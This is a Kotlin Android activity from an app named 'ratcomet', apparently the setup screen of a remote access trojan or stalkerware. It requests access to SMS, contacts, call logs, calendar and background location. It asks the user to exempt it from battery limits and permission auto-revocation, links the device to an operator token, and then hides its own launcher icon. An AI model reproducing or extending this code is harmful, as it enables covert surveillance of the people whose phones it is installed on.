package ug.hix.ratcomet

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.lifecycle.ViewModelProvider
import com.google.android.material.snackbar.Snackbar
import kotlinx.android.synthetic.main.activity_main.*

class MainActivity : AppCompatActivity() {
    private lateinit var viewModel: MainViewModel
    private lateinit var powerManager: PowerManager
    private lateinit var mPackageManager: PackageManager
    private lateinit var previewResult: ActivityResultLauncher<Intent>
    private lateinit var ignorePermissionRevoke : ActivityResultLauncher<Intent>
    private var PERMISSION_ALL = 1
    private val PERMISSIONS = arrayOf(
        android.Manifest.permission.READ_CALENDAR,
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.READ_PHONE_STATE,
        android.Manifest.permission.ACCESS_FINE_LOCATION,
        android.Manifest.permission.ACCESS_COARSE_LOCATION
    )
//    android.Manifest.permission.READ_PHONE_NUMBERS

    @SuppressLint("BatteryLife")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        powerManager = this.getSystemService(Context.POWER_SERVICE) as PowerManager
        mPackageManager = this.packageManager
        viewModel = ViewModelProvider(this,MainViewModelFactory()).get(MainViewModel::class.java)
        ignorePermissionRevoke = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
            displayForm()
        }
        previewResult = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) {
            finishSnackBar()
        }
        token_value.setOnFocusChangeListener { _, b ->
            val token = token_value.text.toString().trim()
//            Toast.makeText(this,token,Toast.LENGTH_LONG).show()
            if (token.isNotEmpty() && !b){
                //out focus and text
                if(token.length == 6) {
                    viewModel.checkValidity(token,this@MainActivity)
                }
                if (token.length != 6)
                    tokenField.error = "Token Must 6 characters"
            }
            if(b) tokenField.isErrorEnabled = false
        }
        viewModel.isTokenPhoneValid.observe(this){
            when(it) {
                "true" -> {
                    tokenField.isErrorEnabled = false
                }
                "false" -> {
                    tokenField.error = "Incorrect Token Or Phone already existing"
                }
                else -> {
//                    Log.d("MainActivity","An excepted result")
                }
            }

        }
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName");
                startActivity(intent)
            }
        }

        activity_button.setOnClickListener {
            if(token_value.text != null){
                if (token_value.text!!.length != 6)
                    tokenField.error = "Token Must 6 characters"
                else
                    statusCheck()
            }
        }

        permission_button.setOnClickListener {
            //Check for permissions
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M){
                if(!hasPermission(this, *PERMISSIONS)){
                    if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q){
                        ActivityCompat.requestPermissions(this, PERMISSIONS.plus(arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)),PERMISSION_ALL)
                    }else{
                        ActivityCompat.requestPermissions(this,PERMISSIONS,PERMISSION_ALL)

                    }
                }else{
                    displayForm()
                }
            }else{
                Snackbar.make(findViewById(R.id.main_activity_layout),"Permission Granted",Snackbar.LENGTH_LONG).show()
                displayForm()
            }

        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if(requestCode == PERMISSION_ALL) {
            if (hasPermission(this, *PERMISSIONS)) {
                if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
                    //enable ignore permission revoke
                    if(!mPackageManager.isAutoRevokeWhitelisted){
                        val builder = AlertDialog.Builder(this)
                                builder.setMessage("Enable Ignore Permission Revoke\n 1. Tap Permissions \n 2. Turn off Remove permissions if app is not used")
                            .setCancelable(false)
                            .setPositiveButton("DISABLE"){
                                    _,_ ->
                                run {
                                    ignorePermissionRevoke.launch(Intent(Intent.ACTION_AUTO_REVOKE_PERMISSIONS))
                                }
                            }
                    }
                    else{
                        displayForm()
                    }
                }else{
                   displayForm()
                }
            }else{
                Snackbar.make(findViewById(R.id.main_activity_layout),"Enable All Permissions",Snackbar.LENGTH_SHORT).show()
            }
        }
    }
    private fun displayForm() {
        activity_button.visibility = View.VISIBLE
        tokenField.visibility = View.VISIBLE
        nameField.visibility = View.VISIBLE
        permission_button.visibility = View.GONE
    }

    private fun disableActivity() {
        val token = token_value.text.toString()
        val name = name_value.text.toString()
        viewModel.saveToken(token,name,this)
        val p = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        p.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        val home = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_HOME)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK

        }
        startActivity(home)
    }
    private fun openAccessibility() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
    }
    private fun hasPermission(context: Context, vararg permissions : String): Boolean = permissions.all{
        ActivityCompat.checkSelfPermission(context,it) == PackageManager.PERMISSION_GRANTED
    }
    private fun statusCheck() {
        val manager = getSystemService(LOCATION_SERVICE) as LocationManager
        if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER) && !manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            buildAlertMessageNoGps()
        }else{
            finishSnackBar()
        }
    }
    private fun finishSnackBar() {
        tokenField.isClickable = false
        nameField.isClickable = false
        activity_button.visibility = View.GONE
        Snackbar.make(findViewById(R.id.main_activity_layout),"Finished SetUp...",Snackbar.LENGTH_INDEFINITE)
            .setAction("CLICK HERE") {
                disableActivity()
                this.finishAffinity()
            }
            .setActionTextColor(
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                    resources.getColor(R.color.colorPrimary, resources.newTheme())
                else
                    resources.getColor(R.color.colorPrimary))
            .show()
    }


    private fun buildAlertMessageNoGps() {
        val builder = AlertDialog.Builder(this)
        builder.setMessage("Location seems to be disabled")
            .setCancelable(false)
            .setPositiveButton("ENABLE"
            ) { _, _ ->
                run {
                    previewResult.launch(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                }
            }
//            .setNegativeButton("No") { dialog, _ -> dialog.cancel() }
        val alert: AlertDialog = builder.create()
        alert.show()
    }


}